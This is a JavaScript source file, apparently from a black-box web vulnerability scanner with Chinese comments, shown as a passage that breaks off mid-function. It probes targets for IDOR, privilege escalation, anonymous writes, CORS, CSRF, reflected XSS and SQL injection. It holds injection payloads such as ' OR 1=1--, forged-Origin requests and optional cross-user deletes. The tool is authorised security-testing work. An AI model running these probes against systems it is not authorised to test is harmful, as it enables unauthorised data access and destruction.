    const baseline = await httpJson(ctx, { baseUrl, method: "GET", path: detailPath, identity: victim.name });
    if (!baseline.ok) continue;
    const victimEntity = extractEntityById(baseline.json, victimId);
    if (!victimEntity) continue;

    const attack = await httpJson(ctx, { baseUrl, method: "GET", path: detailPath, identity: attacker.name });
    const owner = extractOwner(victimEntity) ?? extractOwner(victimItem);
    const id = `blackbox-idor-${detailPath.replace(/[^a-z0-9]+/gi, "-").replace(/^-|-$/g, "")}`;
    let rec;
    if (attack.ok && extractEntityById(attack.json, victimId)) {
      rec = makeRecord(ctx, baseUrl, {
        caseId: id,
        name: `黑盒·跨用户读取（IDOR）${detailPath}`,
        method: "GET",
        path: detailPath,
        identity: attacker.name,
        res: attack,
        expectation: "身份 A 不得读取身份 B 的对象",
        verdict: VERDICT.VULNERABLE,
        actual: `${attacker.name} 读取 ${victim.name} 的对象 #${victimId} 成功（HTTP ${attack.status}）${
          owner ? `；归属字段 ${owner.field}=${owner.value}` : ""
        }`,
        grade: "cross-proven",
        crossProof: `${victim.name} 详情基线 + ${attacker.name} 越权响应返回同一对象 #${victimId}`,
        impact: "可读取他人业务对象",
      });
    } else if (attack.ok) {
      rec = makeRecord(ctx, baseUrl, {
        caseId: id,
        name: `黑盒·跨用户读取（IDOR）${detailPath}`,
        method: "GET",
        path: detailPath,
        identity: attacker.name,
        res: attack,
        expectation: "身份 A 不得读取身份 B 的对象",
        verdict: VERDICT.INCONCLUSIVE,
        actual: `HTTP ${attack.status}，但响应中未找到对象 #${victimId}（可能被脱敏或形状不符）`,
        grade: "http-only",
      });
    } else if (isDenied(attack.status)) {
      rec = makeRecord(ctx, baseUrl, {
        caseId: id,
        name: `黑盒·跨用户读取（IDOR）${detailPath}`,
        method: "GET",
        path: detailPath,
        identity: attacker.name,
        res: attack,
        expectation: "身份 A 不得读取身份 B 的对象",
        verdict: VERDICT.BLOCKED,
        actual: `HTTP ${attack.status}，服务端拒绝跨用户读取`,
        grade: "http-only",
      });
    } else {
      rec = makeRecord(ctx, baseUrl, {
        caseId: id,
        name: `黑盒·跨用户读取（IDOR）${detailPath}`,
        method: "GET",
        path: detailPath,
        identity: attacker.name,
        res: attack,
        expectation: "身份 A 不得读取身份 B 的对象",
        verdict: VERDICT.INCONCLUSIVE,
        actual: `HTTP ${attack.status}，无法判定是否越权`,
        grade: "http-only",
      });
    }
    records.push(rec);
    emitRecord(ctx, rec);
  }
  return records;
}

/**
 * 跨用户写（PUT/PATCH）与跨用户删除（DELETE）。整类会修改甚至销毁目标数据，
 * 默认关闭，只在 blackbox.allowMutation=true 时执行；DELETE 不可回滚，还要再显式 allowDestructive。
 * 判定不看状态码：PUT/PATCH 以「归属人复核字段值确实被改」为准并在成功后尽力还原（还原结果写进证据），
 * DELETE 以「归属人复读对象是否消失」为准——请求被接受但数据未动只算 inconclusive，
 * 既不记漏洞，也不记「已防住」。
 */
async function probeWriteIdor(
  ctx,
  baseUrl,
  routes,
  { attacker, victim },
  { methods = ["PUT", "PATCH"], destructive = false } = {},
  limit = MAX_PROBE_ROUTES
) {
  const records = [];
  for (const route of routes.filter((r) => r.method === "GET").slice(0, limit)) {
    const list = await httpJson(ctx, { baseUrl, method: "GET", path: route.path, identity: victim.name });
    if (!list.ok) continue;
    const items = extractItems(list.json);
    const victimItem = items.find((o) => extractId(o) != null);
    if (!victimItem) continue;
    const victimId = extractId(victimItem);
    const field = Object.keys(victimItem).find(
      (k) =>
        typeof victimItem[k] === "string" &&
        !["id", "email", "status", "createdAt", "updatedAt", "token"].includes(k) &&
        extractOwner(victimItem)?.field !== k
    );
    if (!field) continue;
    const original = victimItem[field];
    const detailPath = `${route.path.replace(/\/+$/, "")}/${encodeURIComponent(victimId)}`;

    for (const method of methods) {
      if (method === "DELETE" && !destructive) continue;
      const canary = `${original}_gb`;

      if (method === "DELETE") {
        const attack = await httpJson(ctx, { baseUrl, method: "DELETE", path: detailPath, identity: attacker.name });
        const after = await httpJson(ctx, { baseUrl, method: "GET", path: detailPath, identity: victim.name });
        const gone = after.status === 404 || (after.ok && !extractEntityById(after.json, victimId));
        const verdict = isDenied(attack.status) ? VERDICT.BLOCKED : gone ? VERDICT.VULNERABLE : VERDICT.INCONCLUSIVE;
        const rec = makeRecord(ctx, baseUrl, {
          caseId: `blackbox-idor-delete-${slug(detailPath)}`,
          name: `黑盒·跨用户删除（IDOR-DELETE）${detailPath}`,
          method: "DELETE",
          path: detailPath,
          identity: attacker.name,
          res: attack,
          expectation: "身份 A 不得删除身份 B 的对象",
          verdict,
          actual:
            verdict === VERDICT.VULNERABLE
              ? `${attacker.name} 发起删除后，${victim.name} 复读 #${victimId} 已不存在（HTTP ${after.status}）`
              : verdict === VERDICT.BLOCKED
                ? `HTTP ${attack.status}，服务端拒绝跨用户删除`
                : `HTTP ${attack.status}，但归属人复读对象仍在（HTTP ${after.status}）——可能是软删除或请求未被处理`,
          grade: verdict === VERDICT.VULNERABLE ? "cross-proven" : "http-only",
          crossProof: verdict === VERDICT.VULNERABLE ? `归属人复读确认对象 #${victimId} 消失（销毁不可回滚）` : null,
          impact: verdict === VERDICT.VULNERABLE ? "可删除他人业务对象（数据销毁不可恢复）" : null,
        });
        records.push(rec);
        emitRecord(ctx, rec);
        continue;
      }

      const payload = { [field]: canary };
      const attack = await httpJson(ctx, {
        baseUrl,
        method,
        path: detailPath,
        identity: attacker.name,
        body: payload,
      });
      const echoed = attack.ok && attack.json && JSON.stringify(attack.json).includes(canary);
      // 响应不回显时改用归属人复读，避免「写成功但服务端只返回 {ok:true}」被判成未复现
      const reread = echoed ? null : await httpJson(ctx, { baseUrl, method: "GET", path: detailPath, identity: victim.name });
      const changed = echoed || (reread?.ok && JSON.stringify(reread.json ?? "").includes(canary));
      let restored = null;
      if (changed) {
        await httpJson(ctx, { baseUrl, method: "PUT", path: detailPath, identity: victim.name, body: { [field]: original } });
        const check = await httpJson(ctx, { baseUrl, method: "GET", path: detailPath, identity: victim.name });
        restored = check.ok && !JSON.stringify(check.json ?? "").includes(canary);
      }
      const rec = makeRecord(ctx, baseUrl, {
        caseId: `blackbox-idor-${method.toLowerCase()}-${slug(detailPath)}`,
        name: `黑盒·跨用户修改（IDOR-${method}）${detailPath}`,
        method,
        path: detailPath,
        identity: attacker.name,
        body: payload,
        res: attack,
        expectation: "身份 A 不得修改身份 B 的对象",
        verdict: changed ? VERDICT.VULNERABLE : isDenied(attack.status) ? VERDICT.BLOCKED : VERDICT.INCONCLUSIVE,
        actual: changed
          ? `${attacker.name} 修改 ${victim.name} 的对象 #${victimId} 生效（字段 ${field}）${
              restored === false ? "；原值恢复未确认，需人工回看" : ""
            }`
          : `HTTP ${attack.status}，未观察到修改生效`,
        grade: changed ? "cross-proven" : "http-only",
        crossProof: changed
          ? `写后复核响应含新值 ${field}=${canary}；已按归属人身份尝试恢复原值（${restored ? "成功" : "未确认"}）`
          : null,
        impact: changed ? "可修改他人业务对象" : null,
      });
      records.push(rec);
      emitRecord(ctx, rec);
    }
  }
  return records;
}

/**
 * 垂直越权：用普通登录身份访问管理端点。黑盒没有源码可判角色，只能按路径命名形状找候选。
 * 关键区分是「端点根本不存在」与「端点存在但正确拒绝」：有管理身份基线时做交叉证明——
 * 管理身份拿得到数据、普通身份拿不到 = blocked（拒绝成立，值得记一条），两边都拿得到 = vulnerable。
 * 只发 GET，不改数据。
 */
async function probeVerticalEscalation(ctx, baseUrl, routes, { user, admin }, limit = MAX_PROBE_ROUTES) {
  const paths = [];
  const seen = new Set();
  const push = (p) => {
    if (!p || seen.has(p) || /[{}$]/.test(p)) return;
    seen.add(p);
    paths.push(p);
  };
  for (const r of routes) if (r.method === "GET" && ADMIN_SEGMENT.test(r.path)) push(r.path);
  for (const p of ADMIN_PATH_GUESSES) push(p);

  const records = [];
  for (const path of paths.slice(0, limit)) {
    const asUser = await httpJson(ctx, { baseUrl, method: "GET", path, identity: user?.name ?? null });
    if (asUser.status === 0) continue;
    const asAdmin = admin ? await httpJson(ctx, { baseUrl, method: "GET", path, identity: admin.name }) : null;
    const adminData = !!asAdmin?.ok && containsSensitiveValue(asAdmin.json);
    const userData = !!asUser.ok && containsSensitiveValue(asUser.json);
    const caseId = `blackbox-vertical-${slug(path)}`;
    const base = {
      caseId,
      name: `黑盒·垂直越权（普通身份访问管理端点）${path}`,
      method: "GET",
      path,
      identity: user?.name ?? null,
      expectation: "管理端点不应对普通登录用户开放",
      impact: null,
    };

    if (userData) {
      const rec = makeRecord(ctx, baseUrl, {
        ...base,
        res: asUser,
        verdict: VERDICT.VULNERABLE,
        actual: `${user?.name ?? "匿名"} 请求管理端点返回 HTTP ${asUser.status}，响应含归属/敏感字段${
          adminData ? `；管理身份 ${admin.name} 同样取得数据（越权成立，不是端点不存在）` : ""
        }`,
        grade: adminData ? "cross-proven" : "http-only",
        crossProof: adminData ? `管理身份 ${admin.name} 基线可取得同类数据，普通身份亦取得` : null,
        impact: "普通用户获得管理面数据",
      });
      records.push(rec);
      emitRecord(ctx, rec);
      continue;
    }
    // 两边都拿不到数据、普通身份又是 404：目标没有这个管理面，不记噪声
    if (asUser.status === 404 && !adminData) continue;

    const denied = isDenied(asUser.status);
    const rec = makeRecord(ctx, baseUrl, {
      ...base,
      res: asUser,
      verdict: denied ? VERDICT.BLOCKED : VERDICT.INCONCLUSIVE,
      actual: denied
        ? `HTTP ${asUser.status}，普通身份被拒${
            adminData ? `；管理身份 ${admin.name} 可取得该端点数据（端点确实存在，拒绝来自角色校验）` : ""
          }`
        : `HTTP ${asUser.status}，响应未取得可确认的敏感数据`,
      grade: adminData ? "cross-proven" : "http-only",
      crossProof: adminData && denied ? `管理身份取得数据、普通身份 HTTP ${asUser.status} 被拒` : null,
    });
    records.push(rec);
    emitRecord(ctx, rec);
  }
  return records;
}

/**
 * 匿名写入：未登录即可创建业务对象。默认关闭（会留数据），只在 allowMutation 下执行。
 * 复现要求「canary 真的存下来了」——由归属人复读列表证明，不是 2xx 就算；
 * 随后立即尝试匿名 DELETE 自清理，清理不确认时在证据里写明遗留对象 ID 交人工。
 */
async function probeAnonymousWrite(ctx, baseUrl, routes, { victim }, limit = 8) {
  const records = [];
  // 匿名 POST 会真的落到目标业务里，候选范围要窄：
  // ①只打「匿名读到 401/403 的集合端点」——这类端点的创建口漏鉴权才是漏洞；公开列表（200）本来就欢迎提交；
  // ②跳过任何带动作/管理语义的路径，避免把 /api/orders/batch-cancel 之类当集合入口 POST；
  // ③不猜 id 字段，写之前先用受害方会话读出真实字段名。
  const ACTION_SEGMENT = /(?:^|\/)(?:login|signin|logout|register|signup|auth|token|refresh|password|reset|verify|activate|cancel|refund|pay|checkout|confirm|approve|reject|import|export|sync|flush|clear|seed|exec|run|shell|admin|manage|internal|batch|bulk|search|health|metrics|ping)(?:\/|$)/i;
  const candidates = routes
    .filter(
      (r) =>
        r.method === "GET" &&
        !/[{}$]/.test(r.path) &&
        !ACTION_SEGMENT.test(r.path) &&
        (r.status === 401 || r.status === 403)
    )
    .slice(0, limit);
  const fieldOf = (items) => {
    const sample = items.find((o) => typeof o === "object" && o != null);
    if (!sample) return null;
    return (
      Object.keys(sample).find(
        (k) =>
          typeof sample[k] === "string" &&
          !["id", "email", "status", "createdAt", "updatedAt", "token"].includes(k) &&
          extractOwner(sample)?.field !== k
      ) ?? null
    );
  };

  for (const route of candidates) {
    const list = await httpJson(ctx, { baseUrl, method: "GET", path: route.path, identity: victim?.name ?? null });
    const field = fieldOf(extractItems(list.json));
    if (!field) continue;
    const canary = `gb-anon-write-${shortId()}`;
    const post = await httpJson(ctx, {
      baseUrl,
      method: "POST",
      path: route.path,
      identity: null,
      body: { [field]: canary },
    });
    if (!post.ok) {
      if (post.status === 401 || post.status === 403) {
        const rec = makeRecord(ctx, baseUrl, {
          caseId: `blackbox-anon-write-${slug(route.path)}`,
          name: `黑盒·未认证写入 ${route.path}`,
          method: "POST",
          path: route.path,
          identity: null,
          body: { [field]: canary },
          res: post,
          expectation: "创建类端点应对匿名请求返回 401/403",
          verdict: VERDICT.BLOCKED,
          actual: `HTTP ${post.status}，匿名写入被拒`,
          grade: "http-only",
        });
        records.push(rec);
        emitRecord(ctx, rec);
      }
      continue;
    }
    // 归属人复读：canary 真的进了数据面才算复现
    const after = await httpJson(ctx, { baseUrl, method: "GET", path: route.path, identity: victim?.name ?? null });
    const stored = after.ok && JSON.stringify(after.json ?? "").includes(canary);
    const newId = extractId(post.json?.data ?? post.json);
    let cleaned = null;
    if (stored && newId != null) {
      const del = await httpJson(ctx, {
        baseUrl,
        method: "DELETE",
        path: `${route.path.replace(/\/+$/, "")}/${encodeURIComponent(newId)}`,
        identity: null,
      });
      const recheck = await httpJson(ctx, { baseUrl, method: "GET", path: route.path, identity: victim?.name ?? null });
      cleaned = !JSON.stringify(recheck.json ?? "").includes(canary);
    }
    const rec = makeRecord(ctx, baseUrl, {
      caseId: `blackbox-anon-write-${slug(route.path)}`,
      name: `黑盒·未认证写入 ${route.path}`,
      method: "POST",
      path: route.path,
      identity: null,
      body: { [field]: canary },
      res: post,
      expectation: "创建类端点应对匿名请求返回 401/403",
      verdict: stored ? VERDICT.VULNERABLE : VERDICT.INCONCLUSIVE,
      actual: stored
        ? `匿名 POST 返回 HTTP ${post.status}，归属人复读列表可见 canary 记录（#${newId ?? "?"}）${
            cleaned === false ? "；自清理未成功，遗留 canary 需人工删除" : ""
          }`
        : `HTTP ${post.status}，但复读列表未见 canary 落库（可能未持久化或形状不符）`,
      grade: stored ? "cross-proven" : "http-only",
      crossProof: stored ? `匿名写入后由 ${victim?.name ?? "归属人"} 列表复读取得 canary=${canary}` : null,
      impact: stored ? "未认证即可创建业务对象（可被用于灌数据/污染归属）" : null,
    });
    records.push(rec);
    emitRecord(ctx, rec);
  }
  return records;
}

// ---------- CORS / CSRF / XSS ----------

const CORS_PROBE_ORIGIN = "https://gb-cors-canary.invalid";
const CSRF_PROBE_ORIGIN = "https://gb-csrf-canary.invalid";
const MAX_CORS_PROBES = 10;
const MAX_CSRF_PROBES = 10;
const MAX_XSS_REQUESTS = 16;
const XSS_PARAM_GUESSES = ["q", "query", "search", "keyword", "name", "message", "title"];

/** 响应头大小写不敏感读取（Host 原样返回服务端大小写）。 */
function headerOf(res, name) {
  const target = name.toLowerCase();
  for (const [k, v] of Object.entries(res?.headers ?? {})) {
    if (k.toLowerCase() === target) return Array.isArray(v) ? String(v[0] ?? "") : String(v ?? "");
  }
  return null;
}

function hasTemplate(path) {
  return /[{}$]/.test(String(path ?? ""));
}

/** 只对真实存在的 GET 路由做浏览器类探测：404 占位不产生 Cookie/CORS/反射语义。 */
function browserCandidates(routes, limit) {
  return getRoutesForProbing(
    routes.filter((r) => r.method === "GET" && !hasTemplate(r.path) && r.status !== 404),
    limit
  );
}

/**
 * CORS：带伪造 Origin 读一次，只看响应头，不发写请求。
 * 判定口径与浏览器一致：`Access-Control-Allow-Origin` 必须精确回显攻击者 Origin，
 * 且同时 `Access-Control-Allow-Credentials: true`，恶意站点才能带上用户会话读取响应。
 * 通配 `*`（无凭证）是公开接口常态，不记；`*`+凭证是规范无效组合，记不确定。
 * 全站通常共用一份 CORS 中间件，命中一条即代表根因；没有命中时保留一条「白名单拒绝」证据。
 */
async function probeCors(ctx, baseUrl, routes, identity, limit = MAX_PROBE_ROUTES) {
  const records = [];
  const candidates = browserCandidates(routes, Math.min(limit, MAX_CORS_PROBES));
  let fallback = null;

  for (const route of candidates) {
    const res = await httpJson(ctx, {
      baseUrl,
      method: "GET",
      path: route.path,
      identity,
      headers: { Origin: CORS_PROBE_ORIGIN },
    });
    if (res.status === 0) continue;
    const acao = (headerOf(res, "access-control-allow-origin") ?? "").trim();
    const credentials = (headerOf(res, "access-control-allow-credentials") ?? "").trim().toLowerCase() === "true";
    if (!acao) continue; // 没有 CORS 头 = 浏览器默认拒绝跨源读取，不记噪声

    const echo = acao === CORS_PROBE_ORIGIN;
    const wildcard = acao === "*";
    const base = {
      caseId: `blackbox-cors-${slug(route.path)}`,
      name: `黑盒·CORS 配置 ${route.path}`,
      method: "GET",
      path: route.path,
      identity,
      res,
      expectation: "跨源读取不应把攻击者 Origin 放进凭证允许列表",
      reqHeaders: { Origin: CORS_PROBE_ORIGIN },
    };

    if (echo && credentials) {
      const rec = makeRecord(ctx, baseUrl, {
        ...base,
        verdict: VERDICT.VULNERABLE,
        actual: `响应回显攻击者 Origin（ACAO=${acao}）且允许凭证（Access-Control-Allow-Credentials: true）`,
        impact: "任意站点可携带用户会话跨源读取该端点数据（CORS 反射 Origin + 允许凭证）",
      });
      records.push(rec);
      emitRecord(ctx, rec);
      break;
    }

    let verdict = null;
    let actual = null;
    if (echo) {
      verdict = VERDICT.INCONCLUSIVE;
      actual = `回显攻击者 Origin（ACAO=${acao}），但未允许凭证；无法携带用户会话跨源读取`;
    } else if (wildcard && credentials) {
      verdict = VERDICT.INCONCLUSIVE;
      actual = "ACAO=* 且允许凭证（该组合按 CORS 规范会被浏览器拒绝，配置无效但未构成可利用的凭证读取）";
    } else if (!wildcard) {
      verdict = VERDICT.BLOCKED;
      actual = `未回显攻击者 Origin（ACAO=${acao}），跨源读取按白名单被拒`;
    }
    if (verdict && (!fallback || (verdict === VERDICT.INCONCLUSIVE && fallback.verdict === VERDICT.BLOCKED))) {
      fallback = { ...base, verdict, actual };
    }
  }

  if (fallback) {
    const rec = makeRecord(ctx, baseUrl, fallback);
    records.push(rec);
    emitRecord(ctx, rec);
  }
  return records;
}

/**
 * CSRF：仅对 Cookie 会话有意义（Bearer 令牌不会被浏览器跨站自动携带）。
 * 复刻「跨站简单请求」形态——form-urlencoded、不带任何 CSRF token、带外部 Origin，
 * 且只用受害身份的**自己名下**对象（与写越权区分：这里不跨用户，只证明服务端没校验来源）。
 * 判定不看状态码：以归属人复读确认字段真的被改写为准，随后尽力恢复原值并写进证据。
 */
async function probeCsrf(ctx, baseUrl, routes, { victim }, limit = MAX_PROBE_ROUTES) {
  const records = [];
  const candidates = browserCandidates(routes, Math.min(limit, MAX_CSRF_PROBES));
  for (const route of candidates) {
    const list = await httpJson(ctx, { baseUrl, method: "GET", path: route.path, identity: victim.name });
    if (!list.ok) continue;
    const items = extractItems(list.json);
    const victimItem = items.find((o) => extractId(o) != null);
    if (!victimItem) continue;
    const victimId = extractId(victimItem);
    const owner = extractOwner(victimItem);
    const field = Object.keys(victimItem).find(
      (k) =>
        typeof victimItem[k] === "string" &&
        !["id", "email", "status", "createdAt", "updatedAt", "token"].includes(k) &&
        owner?.field !== k
    );
    if (!field) continue;
    const original = victimItem[field];
    const detailPath = `${route.path.replace(/\/+$/, "")}/${encodeURIComponent(victimId)}`;
    const canary = `${original}_csrf`;

    for (const method of ["PATCH", "PUT"]) {
      const form = new URLSearchParams({ [field]: canary }).toString();
      const attack = await httpJson(ctx, {
        baseUrl,
        method,
        path: detailPath,
        identity: victim.name,
        body: form,
        contentType: "application/x-www-form-urlencoded",
        headers: { Origin: CSRF_PROBE_ORIGIN },
      });
      if (attack.status === 404 || attack.status === 405) continue; // 端点不接这个方法，不是 CSRF 结论
      const base = {
        caseId: `blackbox-csrf-${method.toLowerCase()}-${slug(detailPath)}`,
        name: `黑盒·CSRF（跨站表单改写）${detailPath}`,
        method,
        path: detailPath,
        identity: victim.name,
        body: { [field]: canary },
        res: attack,
        expectation: "改写用户数据的请求应校验 Origin 或 CSRF token",
        reqHeaders: { Origin: CSRF_PROBE_ORIGIN, "Content-Type": "application/x-www-form-urlencoded" },
      };
      if (isDenied(attack.status)) {
        const rec = makeRecord(ctx, baseUrl, {
          ...base,
          verdict: VERDICT.BLOCKED,
          actual: `HTTP ${attack.status}，带外部 Origin 的跨站表单改写被拒`,
        });
        records.push(rec);
        emitRecord(ctx, rec);
        break;
      }
      const reread = await httpJson(ctx, { baseUrl, method: "GET", path: detailPath, identity: victim.name });
      const changed = reread.ok && String(reread.json ? JSON.stringify(reread.json) : reread.body ?? "").includes(canary);
      let restored = null;
      if (changed) {
        await httpJson(ctx, {
          baseUrl,
          method: "PUT",
          path: detailPath,
          identity: victim.name,
          body: { [field]: original },
        });
        const check = await httpJson(ctx, { baseUrl, method: "GET", path: detailPath, identity: victim.name });
        restored = check.ok && !JSON.stringify(check.json ?? "").includes(canary);
      }
      const rec = makeRecord(ctx, baseUrl, {
        ...base,
        verdict: changed ? VERDICT.VULNERABLE : VERDICT.INCONCLUSIVE,
        actual: changed
          ? `外部 Origin 的 form 请求未带 CSRF token 却改写了 ${victim.name} 自己的对象 #${victimId}（字段 ${field}）${
              restored === false ? "；原值恢复未确认，需人工回看" : ""
            }（未判定会话 Cookie 的 SameSite 属性）`
          : `HTTP ${attack.status}，但归属人复读未见字段 ${field} 被改写`,
        grade: changed ? "cross-proven" : "http-only",
        crossProof: changed
          ? `外部 Origin 写后由 ${victim.name} 复读确认 ${field}=${canary}；已尝试恢复原值（${restored ? "成功" : "未确认"}）`
          : null,
        impact: changed ? "缺少 CSRF 防护：跨站表单可改写已登录用户的数据" : null,
      });
      records.push(rec);
      emitRecord(ctx, rec);
      break;
    }
  }
  return records;
}

/**
 * 反射型 XSS：只做无害 canary 反射，不注入可执行脚本。
 * 载荷是 `<随机串>"><gbx>`：尖括号与引号足以证明 HTML 上下文未转义，`<gbx>` 是未知标签、
 * 浏览器不会执行任何代码。只有响应确为 HTML 且**原样**包含完整载荷才判漏洞；
 * 反射了 canary 但尖括号/引号被编码则记 blocked；JSON 响应不参与判定（避免把普通回显算成 XSS）。
 */
async function probeXss(ctx, baseUrl, routes, identity, limit = MAX_PROBE_ROUTES) {
  const records = [];
  let budget = MAX_XSS_REQUESTS;
  const candidates = browserCandidates(routes, Math.min(limit, 8));

  for (const route of candidates) {
    const declared = (route.queryParams ?? []).filter((n) => typeof n === "string" && n.length > 0);
    const params = (declared.length ? declared : XSS_PARAM_GUESSES).slice(0, 2);
    let reported = false;
    for (const param of params) {
      if (budget < 1) return records;
      budget -= 1;
      const canary = `gbx${shortId("").replace(/^_/, "")}`;
      const payload = `${canary}"><gbx>`;
      const sep = route.path.includes("?") ? "&" : "?";
      const path = `${route.path}${sep}${encodeURIComponent(param)}=${encodeURIComponent(payload)}`;
      const res = await httpJson(ctx, { baseUrl, method: "GET", path, identity });
      if (!isOk(res.status)) continue;
      const body = res.body ?? "";
      const type = headerOf(res, "content-type") ?? "";
      const isHtml = /text\/html|application\/xhtml\+xml/i.test(type) || (!type && /^\s*(?:<!doctype html|<html)/i.test(body));
      if (!isHtml) continue;
      const base = {
        caseId: `blackbox-xss-${slug(route.path)}`,
        name: `黑盒·反射型 XSS ${route.path} 参数 ${param}`,
        method: "GET",
        path,
        identity,
        res,
        expectation: "HTML 输出必须对请求参数做上下文转义",
      };
      if (body.includes(payload)) {
        const rec = makeRecord(ctx, baseUrl, {
          ...base,
          verdict: VERDICT.VULNERABLE,
          actual: `HTML 响应原样包含未转义载荷 ${payload}（Content-Type: ${type || "未声明"}）`,
          impact: "反射型 XSS（HTML 上下文未转义，可执行任意脚本）",
        });
        records.push(rec);
        emitRecord(ctx, rec);
        reported = true;
        break;
      }
      if (body.includes(canary) && /&lt;gbx|&#60;gbx|&#x3c;gbx/i.test(body)) {
        const rec = makeRecord(ctx, baseUrl, {
          ...base,
          verdict: VERDICT.BLOCKED,
          actual: "响应反射了 canary，但尖括号/引号已被 HTML 编码（如 &lt;gbx）",
        });
        records.push(rec);
        emitRecord(ctx, rec);
        reported = true;
        break;
      }
    }
    if (reported) continue;
  }
  return records;
}

const SQL_ERROR_SIGNATURES = [  "SQL syntax", "MySQL server", "SQLite3::query", "ORA-", "PostgreSQL",
  "Microsoft SQL Server", "Unclosed quotation mark", "near \"", "syntax error",
];

const slug = (s) =>
  String(s)
    .replace(/[^a-z0-9]+/gi, "-")
    .replace(/^-|-$/g, "");

/** 注入候选参数：OpenAPI 声明的参数优先（完整序列）；无规格的目标用常见参数名做轻量探测。
 *  黑盒请求量必须设预算，否则 14 条路由 × 多参数会把目标打爆。 */
const MAX_PARAMS_PER_ROUTE = 3;
const MAX_SQLI_REQUESTS = 140;
// 数字语境单独配额：与字符串语境共用一份时，先跑的那类会把后一类饿死（漏报）
const MAX_SQLI_NUMERIC_REQUESTS = 70;
const MAX_TRAVERSAL_REQUESTS = 120;
const GUESSED_PARAMS = ["q", "query", "search", "keyword"];

function sqliParams(route) {
  const declared = (route?.queryParams ?? []).filter((n) => typeof n === "string" && n.length > 0);
  if (declared.length) return declared.slice(0, MAX_PARAMS_PER_ROUTE).map((name) => ({ name, declared: true }));
  return GUESSED_PARAMS.slice(0, MAX_PARAMS_PER_ROUTE - 1).map((name) => ({ name, declared: false }));
}

const len = (r) => (r.body ?? "").length;

/** 注入/穿越的请求配额要花在真实路由上：规格声明的路由优先，纯 404 占位的目录探测结果垫底 */
function getRoutesForProbing(routes, limit) {
  const rank = (r) => (r.source === "openapi" ? 0 : r.status === 404 ? 2 : 1);
  return routes
    .filter((r) => r.method === "GET")
    .sort((a, b) => rank(a) - rank(b))
    .slice(0, limit);
}

async function probeSqliOnParam(ctx, baseUrl, route, param, identity, budget, declared) {
  const basePath = route.path;
  const sep = basePath.includes("?") ? "&" : "?";
  const url = (v) => `${basePath}${sep}${encodeURIComponent(param)}=${v}`;
  const send = async (payload) => {
    budget.remaining -= 1;
    return httpJson(ctx, { baseUrl, method: "GET", path: url(encodeURIComponent(payload)), identity });
  };

  if (budget.remaining < (declared ? 5 : 3)) return null;
  const baseline1 = await httpJson(ctx, { baseUrl, method: "GET", path: url("test"), identity });
  budget.remaining -= 1;
  if (baseline1.status === 0) return null;
  const b1 = len(baseline1);

  const errRes = await send("' OR 1=1--");
  const errBody = errRes.body ?? "";
  const signature = SQL_ERROR_SIGNATURES.find((s) => errBody.includes(s));
  const errorRecord = () =>
    makeRecord(ctx, baseUrl, {
      caseId: `blackbox-sqli-error-${slug(`${basePath}:${param}`)}`,
      name: `黑盒·SQL 注入（错误回显）${basePath} 参数 ${param}`,
      method: "GET",
      path: url(encodeURIComponent("' OR 1=1--")),
      identity,
      res: errRes,
      expectation: "输入不得进入 SQL 语句导致数据库错误回显",
      verdict: VERDICT.VULNERABLE,
      actual: `响应包含数据库错误特征：${signature}`,
      impact: "SQL 注入（错误回显）",
    });
  if (signature) return errorRecord();

  // 单对象端点（fetchone/详情型）：正常值明确未命中，注入后却独占返回对象 → WHERE 条件被放开
  const baseMissed = !isOk(baseline1.status) && (baseline1.status === 404 || baseline1.status === 400);
  const obj = errRes.json;
  if (
    baseMissed &&
    isOk(errRes.status) &&
    obj != null &&
    typeof obj === "object" &&
    !Array.isArray(obj) &&
    Object.keys(obj).length > 0
  ) {
    return makeRecord(ctx, baseUrl, {
      caseId: `blackbox-sqli-single-${slug(`${basePath}:${param}`)}`,
      name: `黑盒·SQL 注入（单对象条件绕过）${basePath} 参数 ${param}`,
      method: "GET",
      path: url(encodeURIComponent("' OR 1=1--")),
      identity,
      res: errRes,
      expectation: "布尔条件不应让未命中的查询返回数据",
      verdict: VERDICT.VULNERABLE,
      actual: `基线 HTTP ${baseline1.status} 未命中，注入后返回对象（字段 ${Object.keys(obj).slice(0, 5).join(",")}）`,
      impact: "SQL 注入（可绕过 WHERE 条件读取数据）",
    });
  }

  // 恒真条件放大了结果集 → 用恒假条件对照，差值由注入而非业务波动解释
  const falseRes = await send("' OR 1=2--");
  const t = len(errRes);
  const f = len(falseRes);
  if (isOk(errRes.status) && isOk(falseRes.status) && b1 > 0 && t > b1 + Math.max(16, b1 * 0.3) && f < t * 0.5) {
    return makeRecord(ctx, baseUrl, {
      caseId: `blackbox-sqli-or-${slug(`${basePath}:${param}`)}`,
      name: `黑盒·SQL 注入（恒真条件放开结果集）${basePath} 参数 ${param}`,
      method: "GET",
      path: url(encodeURIComponent("' OR 1=1--")),
      identity,
      res: errRes,
      expectation: "布尔条件不应改变查询结果集",
      verdict: VERDICT.VULNERABLE,
      actual: `基线 ${b1}B → ' OR 1=1-- 得 ${t}B，' OR 1=2-- 仅 ${f}B`,
      impact: "SQL 注入（可放开 WHERE 条件读取全量数据）",
    });
  }

  if (!declared || budget.remaining < 3) return null;
  const baseline2 = await httpJson(ctx, { baseUrl, method: "GET", path: url("test"), identity });
  budget.remaining -= 1;
  const stable = b1 > 0 && Math.abs(b1 - len(baseline2)) <= Math.max(1, b1 * 0.1);
  if (!stable) return null;

  const trueRes = await send("test' AND 1=1--");
  const andFalse = await send("test' AND 1=2--");
  const tt = len(trueRes);
  const ff = len(andFalse);
  const trueClose = Math.abs(tt - b1) <= Math.max(1, b1 * 0.2);
  const falseDiff = Math.abs(ff - b1) > Math.max(16, b1 * 0.3);
  if (isOk(trueRes.status) && isOk(andFalse.status) && trueClose && falseDiff) {
    return makeRecord(ctx, baseUrl, {
      caseId: `blackbox-sqli-blind-${slug(`${basePath}:${param}`)}`,
      name: `黑盒·SQL 注入（布尔盲注）${basePath} 参数 ${param}`,
      method: "GET",
      path: url(encodeURIComponent("test' AND 1=1--")),
      identity,
      res: andFalse,
      expectation: "布尔条件不应改变查询结果集",
      verdict: VERDICT.VULNERABLE,
      actual: `真条件响应 ${tt}B ≈ 基线 ${b1}B，假条件 ${ff}B 差异显著`,
      impact: "SQL 注入（布尔盲注）",
    });
  }
  return null;
}

/** 响应像不像「取到了行」：列表看条目数，详情看是否有非错误字段的对象。 */
function rowCount(res) {
  if (!res?.ok) return -1;
  const items = extractItems(res.json);
  if (items.length > 0) return items.length;
  const j = res.json;
  if (!j || typeof j !== "object") return 0;
  // extractItems 只认非空数组，所以 {items:[]} 这种「明确零行」的信封要单独认下来，
  // 否则会被下面的「有键就算命中」判成 1 行，数字注入的基线前置条件永远不成立。
  let sawEmptyList = false;
